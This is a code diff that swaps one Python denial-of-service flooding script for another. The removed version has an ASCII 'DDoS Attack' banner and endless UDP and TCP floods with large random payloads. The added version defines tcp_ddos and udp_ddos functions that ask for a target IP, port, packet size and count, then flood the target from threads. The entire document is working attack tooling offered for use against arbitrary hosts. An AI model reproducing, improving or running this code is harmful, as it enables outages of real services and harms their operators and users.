@@ -1,147 +1,47 @@
-#!/usr/bin/env python3
-#Code by LeeOn123 Remake & Upgrade Tools By Igametopia
-import os
-import sys
-import random
 import socket
 import threading
-import time
 
+def tcp_ddos(target_ip, target_port, packet_size, num_packets):
+    data = b'X' * packet_size  # Packet data
 
+    for _ in range(num_packets):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            s.connect((target_ip, target_port))
+            s.sendall(data)
+            print("\033[92m[*] Attack successful! Target IP:", target_ip, "Port:", target_port)
+        except Exception as e:
+            print("\033[91m[!] Error occurred:", e)
+        finally:
+            s.close()
 
-print("""
+def udp_ddos(target_ip, target_port, packet_size, num_packets):
+    data = b'X' * packet_size  # Packet data
 
-         
-\033[93m░█▀▀▄ ░█▀▀▄ █▀▀█ █▀▀ 
-░█─░█ ░█─░█ █──█ ▀▀█ 
-░█▄▄▀ ░█▄▄▀ ▀▀▀▀ ▀▀▀ 
+    for _ in range(num_packets):
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            s.sendto(data, (target_ip, target_port))
+            print("\033[92m[*] Attack successful! Target IP:", target_ip, "Port:", target_port)
+        except Exception as e:
+            print("\033[91m[!] Error occurred:", e)
+        finally:
+            s.close()
 
-─█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ─█▀▀█ ░█▀▀█ ░█─▄▀ 
-░█▄▄█ ─░█── ─░█── ░█▄▄█ ░█─── ░█▀▄─ 
-░█─░█ ─░█── ─░█── ░█─░█ ░█▄▄█ ░█─░█                  
-                                                                             """)
+def main():
+    target_ip = input("Enter target IP address: ")
+    target_port = int(input("Enter target port: "))
+    packet_size = int(input("Enter packet size: "))
+    num_packets = int(input("Enter number of packets: "))
+    num_threads = int(input("Enter number of threads: "))
 
+    # Create threads for TCP and UDP attacks
+    tcp_thread = threading.Thread(target=tcp_ddos, args=(target_ip, target_port, packet_size, num_packets))
+    udp_thread = threading.Thread(target=udp_ddos, args=(target_ip, target_port, packet_size, num_packets))
 
+    # Start the attack
+    tcp_thread.start()
+    udp_thread.start()
 
-
-ip = str(input("\033[91m>> IP Address :"))
-port = int(input("\033[91m>> Port : "))
-choice = str(input("\033[91m>> Method : "))
-times = int(input("\033[91m>> Packets : "))
-threads = int(input("\033[91m>> Threads : "))
-def run():
-	data = random._urandom(600000)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i + "\033[92m Sent!!!")
-		except:
-			print("[!] Error!!!")
-
-def run2():
-	data = random._urandom(100048)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			s.connect((ip,port))
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-				s.send(data)
-			print(i +" \033[92m OMO TNEKT!!!")
-		except:
-			s.close()
-			print("\033[92m TEAM X IN ATTACK " + ip)
-			print()
-
-for y in range(threads):
-	if choice == "y":
-		th = threading.Thread(target = run)
-		th.start()
-	else:
-		th = threading.Thread(target = run2)
-		th.start()
-
+if __name__ == "__main__":
+    main()
